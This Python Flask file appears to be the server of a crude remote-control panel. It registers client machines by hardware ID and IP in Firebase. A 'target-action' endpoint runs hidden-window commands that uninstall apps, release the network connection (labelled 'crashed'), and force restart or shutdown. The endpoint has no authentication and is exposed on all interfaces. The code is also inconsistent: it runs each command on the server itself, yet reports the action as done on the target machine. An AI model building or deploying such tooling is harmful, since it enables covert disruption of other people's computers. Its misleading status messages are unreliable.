import os
import json
from flask import Flask, render_template, request, jsonify
import subprocess
import firebase_admin
from firebase_admin import credentials, db

app = Flask(__name__)

# Firebase Initialization using Environment Variable
if not firebase_admin._apps:
    firebase_config_str = os.environ.get('FIREBASE_CONFIG_JSON')
    if firebase_config_str:
        cred_dict = json.loads(firebase_config_str)
        cred = credentials.Certificate(cred_dict)
    else:
        cred = credentials.Certificate("firebase_credentials.json")
        
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://vipchaetos-default-rtdb.firebaseio.com/'
    })

@app.route('/')
def index():
    return render_template('vip.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip_addr = request.remote_addr
    
    ref = db.reference(f'clients/{hwid}')
    ref.set({
        'ip': ip_addr,
        'status': 'ONLINE',
        'last_seen': 'Active Live'
    })
    
    return jsonify({"status": "registered", "assigned_hwid": hwid})

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action')

    if action == 'uninstall':
        bat_path = os.path.join(os.path.dirname(__file__), "App-Uninstaller-Combined.bat")
        if os.path.exists(bat_path):
            subprocess.Popen(f'cmd.exe /c start cmd.exe /k "{bat_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"App-Uninstaller executed on {hwid}"})

    elif action == 'clean':
        return jsonify({"message": f"Notepad Clean executed on {hwid}"})

    elif action == 'netcrash':
        subprocess.Popen('ipconfig /release', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Internet connection crashed for {hwid}!"})

    elif action == 'netrestore':
        subprocess.Popen('ipconfig /renew', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Internet connection restored for {hwid}!"})

    elif action == 'restart':
        subprocess.Popen('shutdown /r /t 0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Remote restart triggered for {hwid}!"})

    elif action == 'shutdown':
        subprocess.Popen('shutdown /s /t 0', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return jsonify({"message": f"Remote shutdown triggered for {hwid}!"})

    return jsonify({"message": "Unknown action requested."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)